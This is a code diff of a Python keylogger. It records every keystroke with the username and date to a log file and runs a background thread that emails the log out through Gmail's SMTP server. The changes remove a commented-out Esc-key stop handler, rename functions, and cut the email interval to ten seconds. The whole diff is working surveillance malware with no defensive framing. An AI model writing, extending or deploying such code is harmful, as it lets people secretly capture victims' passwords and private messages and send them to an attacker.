@@ -21,8 +21,6 @@ SECPERMIN = 60
 CYCLE = INTERVALS * SECPERMIN # Time interval to Email and Clean Logs. (MIN * SECS/MIN)
 FILENAME = "log.txt" # Filename.
 
-#finished = False # Global Track to see if Log is finished.
-
 # Dictionary stores all non-alphanumeric keys.
 ReplaceCode = {Key.space: ' ', Key.enter: ' [enter]\n', Key.tab: '[tab]', Key.esc: ' [esc] ', Key.shift: ' [shift] ', Key.ctrl: ' [ctrl] ', Key.backspace: ' [back] ', Key.cmd: ' [cmd] ', Key.alt: ' [alt] ', Key.caps_lock: ' [caps] '}
 
@@ -39,18 +37,12 @@ def on_press(key):
     if text != None:
         write_file(FILENAME, text)
 
-"""
-def on_release(key):
-    #Stops Log Execution if Esc is pressed.
-    if key == Key.esc:
-        return False
-"""
 
-def IntervalEmailandCls():
+def sendemail():
 
     while True:
 
-        time.sleep(CYCLE) # Pause for cycle time before sending email, will act as a clock.
+        time.sleep(10) # Pause for cycle time before sending email, will act as a clock.
 
         server = smtplib.SMTP('smtp.gmail.com', 587)  # Sets up a port connection.
 
@@ -96,7 +88,7 @@ def recreate_file(file):
         file.write("User: {0} | Date: {1} \n".format(getpass.getuser(), datetime.now().replace(microsecond=0))) # Initialize File with Userid and Date.
 
 # Function to retrieve Key presses.
-def StartLog():
+def startlog():
 
     # Create a new file to write to.
     recreate_file(FILENAME)
@@ -108,8 +100,8 @@ def StartLog():
 # Main method.
 def main():
 
-    KeyLogger = Thread(target=StartLog, daemon=True) # daemonic thread --> Stop threads once Main ends.
-    Timer = Thread(target=IntervalEmailandCls, daemon=True)
+    KeyLogger = Thread(target=startlog, daemon=True) # daemonic thread --> Stop threads once Main ends.
+    Timer = Thread(target=sendemail, daemon=True)
 
     try:
         # Multithread
